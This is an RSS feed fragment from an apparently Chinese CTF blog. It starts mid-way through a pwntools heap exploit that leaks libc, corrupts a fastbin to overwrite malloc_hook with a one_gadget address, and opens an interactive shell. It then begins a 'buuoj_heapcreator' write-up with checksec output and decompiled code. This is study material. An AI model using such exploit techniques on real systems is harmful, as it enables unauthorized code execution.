&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;b calloc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xb0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x91&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset = &lt;span class=&#34;number&#34;&gt;0x7f99de237b88&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x7f99dde73000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = addr -(&lt;span class=&#34;number&#34;&gt;0x7f99de237b88&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x7f99dde73000&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = libc_base+&lt;span class=&#34;number&#34;&gt;0x3c4b10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#onegadget = 0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = &lt;span class=&#34;number&#34;&gt;0x4527a&lt;/span&gt;+libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;realloc = libc_base+ libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;realloc&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;main_arena : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x71&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,p64(malloc_hook-&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)+p64(onegadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload +=p64(realloc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;-&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/03/20/buuoj-heapcreator/</guid>
            <title>buuoj_heapcreator</title>
            <link>http://example.com/2022/03/20/buuoj-heapcreator/</link>
            <category>writeup</category>
            <pubDate>Sun, 20 Mar 2022 23:59:28 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;这次刷题记录开始着重整理下在glibc-223下的一些利用姿势&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这次刷题记录开始着重整理下在glibc-223下的一些利用姿势&#34;&gt;#&lt;/a&gt; 这次刷题记录开始着重整理下在 Glibc-2.23 下的一些利用姿势&lt;/h2&gt;
&lt;p&gt;说明下 buuoj 的一些不好的地方，buuoj 基本不会给 libc, 而有些没有后门的程序，往往需要去泄露 libc 的基地址，但是最近的一些题目很孬去匹配到正确的版本，我也就不清楚是什么问题了。这里就不过多赘述了，而匹配 libc 就不作为本文的一个要点。我们只要在本地同通过测试就好了&lt;/p&gt;
&lt;h2 id=&#34;浅析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#浅析&#34;&gt;#&lt;/a&gt; 浅析&lt;/h2&gt;
&lt;p&gt;题目环境以及保护&lt;br&gt;
 ubuntu16&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ checksec --file=heapcreator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/giantbranch/Desktop/buuoj/heapcreater/heapcreator&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (&lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ file heapcreator &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heapcreator: ELF &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-bit LSB executable, x86&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;, version &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86&lt;span class=&#34;number&#34;&gt;-64.&lt;/span&gt;so&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&#34;number&#34;&gt;2.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.32&lt;/span&gt;, BuildID[sha1]=&lt;span class=&#34;number&#34;&gt;5e69111&lt;/span&gt;eca74cba2fb372dfcd3a59f93ca58f858, not stripped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序呢并没有开启 full relro, 这里就首先反映到是不是可以修改函数的 got 表呢？根据题目描述，其实就已经断定了这是一个堆题。&lt;/p&gt;
&lt;p&gt;接下来我们就主要看看其逻辑思路了&lt;/p&gt;
&lt;h3 id=&#34;main&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#main&#34;&gt;#&lt;/a&gt; main&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(_bss_start, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;4uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( atoi(buf) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        create_heap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        edit_heap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        show_heap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        delete_heap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid Choice&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;经典的分支结构&lt;/p&gt;
&lt;h3 id=&#34;menu&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#menu&#34;&gt;#&lt;/a&gt; MENU&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;--------------------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;          Heap Creator          &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;--------------------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 1. Create a Heap               &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 2. Edit a Heap                 &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 3. Show a Heap                 &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 4. Delete a Heap               &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 5. Exit                        &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;--------------------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;creat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#creat&#34;&gt;#&lt;/a&gt; Creat&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 